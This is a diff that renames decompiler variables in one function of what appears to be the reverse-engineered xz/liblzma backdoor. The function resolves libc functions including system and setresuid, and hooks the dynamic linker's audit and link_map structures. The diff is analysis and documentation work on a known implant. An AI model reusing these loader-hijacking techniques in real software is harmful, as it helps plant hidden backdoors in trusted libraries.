@@ -24,19 +24,19 @@ BOOL find_link_map_l_name
   elf_info_t *ldso_elf;
   link_map *candidate_map;
   dl_audit_symbind_alt_fn code_start;
-  BOOL BVar4;
-  uint uVar5;
+  BOOL success;
+  ptrdiff_t snapshot_offset;
   lzma_allocator *allocator;
-  pfn_exit_t ppVar6;
-  pfn_setlogmask_t ppVar7;
-  pfn_setresgid_t ppVar8;
-  lzma_allocator *allocator_00;
-  Elf64_Sym *pEVar9;
-  pfn_BN_num_bits_t ppVar10;
-  uchar *code_start_00;
-  pfn_setresuid_t ppVar11;
-  pfn_system_t ppVar12;
-  pfn_shutdown_t ppVar13;
+  pfn_exit_t exit_fn;
+  pfn_setlogmask_t setlogmask_fn;
+  pfn_setresgid_t setresgid_fn;
+  lzma_allocator *libcrypto_allocator;
+  Elf64_Sym *audit_preinit_symbol;
+  pfn_BN_num_bits_t bn_num_bits_fn;
+  uchar *audit_sym_start;
+  pfn_setresuid_t setresuid_fn;
+  pfn_system_t system_fn;
+  pfn_shutdown_t shutdown_fn;
   link_map *snapshot_entry;
   link_map *runtime_entry;
   u64 displacement;
@@ -44,42 +44,42 @@ BOOL find_link_map_l_name
   link_map *relro_limit;
   link_map *liblzma_snapshot;
   
-  BVar4 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
-  if (BVar4 != FALSE) {
+  success = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
+  if (success != FALSE) {
     libc_imports = imported_funcs->libc;
     liblzma_snapshot = data_handle->data->liblzma_map;
     allocator = get_lzma_allocator();
     allocator->opaque = data_handle->elf_handles->libc;
-    ppVar6 = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
-    libc_imports->exit = ppVar6;
-    if (ppVar6 != (pfn_exit_t)0x0) {
+    exit_fn = (pfn_exit_t)lzma_alloc(0x8a8,allocator);
+    libc_imports->exit = exit_fn;
+    if (exit_fn != (pfn_exit_t)0x0) {
       libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
-    ppVar7 = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
-    libc_imports->setlogmask = ppVar7;
-    if (ppVar7 != (pfn_setlogmask_t)0x0) {
+    setlogmask_fn = (pfn_setlogmask_t)lzma_alloc(0x428,allocator);
+    libc_imports->setlogmask = setlogmask_fn;
+    if (setlogmask_fn != (pfn_setlogmask_t)0x0) {
       libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
-    ppVar8 = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
-    libc_imports->setresgid = ppVar8;
-    if (ppVar8 != (pfn_setresgid_t)0x0) {
+    setresgid_fn = (pfn_setresgid_t)lzma_alloc(0x5f0,allocator);
+    libc_imports->setresgid = setresgid_fn;
+    if (setresgid_fn != (pfn_setresgid_t)0x0) {
       libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
     }
-    allocator_00 = get_lzma_allocator();
+    libcrypto_allocator = get_lzma_allocator();
     ldso_elf = data_handle->elf_handles->dynamic_linker;
-    allocator_00->opaque = data_handle->elf_handles->libcrypto;
-    pEVar9 = elf_symbol_get(ldso_elf,STR_dl_audit_preinit,0);
-    if (pEVar9 != (Elf64_Sym *)0x0) {
-      ppVar10 = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,allocator_00);
-      imported_funcs->BN_num_bits = ppVar10;
-      if (ppVar10 != (pfn_BN_num_bits_t)0x0) {
+    libcrypto_allocator->opaque = data_handle->elf_handles->libcrypto;
+    audit_preinit_symbol = elf_symbol_get(ldso_elf,STR_dl_audit_preinit,0);
+    if (audit_preinit_symbol != (Elf64_Sym *)0x0) {
+      bn_num_bits_fn = (pfn_BN_num_bits_t)lzma_alloc(0x4e0,libcrypto_allocator);
+      imported_funcs->BN_num_bits = bn_num_bits_fn;
+      if (bn_num_bits_fn != (pfn_BN_num_bits_t)0x0) {
         imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
       }
       ldso_elf = data_handle->elf_handles->dynamic_linker;
-      code_start_00 = ldso_elf->elfbase->e_ident + pEVar9->st_value;
-      BVar4 = elf_contains_vaddr(ldso_elf,code_start_00,pEVar9->st_size,4);
+      audit_sym_start = ldso_elf->elfbase->e_ident + audit_preinit_symbol->st_value;
+      success = elf_contains_vaddr(ldso_elf,audit_sym_start,audit_preinit_symbol->st_size,4);
       snapshot_iter = liblzma_snapshot + 0x960;
-      if (BVar4 != FALSE) {
+      if (success != FALSE) {
 LAB_001041f0:
         if (liblzma_snapshot != snapshot_iter) {
           ldso_elf = data_handle->elf_handles->liblzma;
@@ -103,50 +103,50 @@ LAB_001041f0:
           }
           if (runtime_entry != (link_map *)0xffffffffffffffff) {
             allocator->opaque = data_handle->elf_handles->libc;
-            ppVar11 = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
-            libc_imports->setresuid = ppVar11;
-            if (ppVar11 != (pfn_setresuid_t)0x0) {
+            setresuid_fn = (pfn_setresuid_t)lzma_alloc(0xab8,allocator);
+            libc_imports->setresuid = setresuid_fn;
+            if (setresuid_fn != (pfn_setresuid_t)0x0) {
               libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
             }
             liblzma_snapshot = data_handle->data->liblzma_map;
             displacement = (long)runtime_entry - (long)liblzma_snapshot;
-            uVar5 = (int)liblzma_snapshot - (int)snapshot_entry;
+            snapshot_offset = (int)liblzma_snapshot - (int)snapshot_entry;
             if (liblzma_snapshot <= snapshot_entry) {
-              uVar5 = (int)snapshot_entry - (int)liblzma_snapshot;
+              snapshot_offset = (int)snapshot_entry - (int)liblzma_snapshot;
             }
-            (hooks->ldso_ctx).libcrypto_l_name = (char **)(data_handle->data->libcrypto_map + uVar5)
+            (hooks->ldso_ctx).libcrypto_l_name = (char **)(data_handle->data->libcrypto_map + snapshot_offset)
             ;
-            BVar4 = find_lea_instruction(code_start_00,code_start_00 + pEVar9->st_size,displacement)
+            success = find_lea_instruction(audit_sym_start,audit_sym_start + audit_preinit_symbol->st_size,displacement)
             ;
-            if (BVar4 == FALSE) {
+            if (success == FALSE) {
               return FALSE;
             }
             code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
-            BVar4 = find_lea_instruction
+            success = find_lea_instruction
                               ((u8 *)code_start,
                                (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                                displacement);
-            if (BVar4 == FALSE) {
+            if (success == FALSE) {
               return FALSE;
             }
             allocator->opaque = data_handle->elf_handles->libc;
-            ppVar12 = (pfn_system_t)lzma_alloc(0x9f8,allocator);
-            libc_imports->system = ppVar12;
-            if (ppVar12 != (pfn_system_t)0x0) {
+            system_fn = (pfn_system_t)lzma_alloc(0x9f8,allocator);
+            libc_imports->system = system_fn;
+            if (system_fn != (pfn_system_t)0x0) {
               libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
             }
-            ppVar13 = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
-            libc_imports->shutdown = ppVar13;
-            if (ppVar13 != (pfn_shutdown_t)0x0) {
+            shutdown_fn = (pfn_shutdown_t)lzma_alloc(0x760,allocator);
+            libc_imports->shutdown = shutdown_fn;
+            if (shutdown_fn != (pfn_shutdown_t)0x0) {
               libc_imports->resolved_imports_count = libc_imports->resolved_imports_count + 1;
             }
-            allocator_00->opaque = data_handle->elf_handles->libcrypto;
+            libcrypto_allocator->opaque = data_handle->elf_handles->libcrypto;
             *libname_offset = displacement;
             return TRUE;
           }
         }
       }
-      lzma_free(imported_funcs->BN_num_bits,allocator_00);
+      lzma_free(imported_funcs->BN_num_bits,libcrypto_allocator);
     }
   }
   return FALSE;
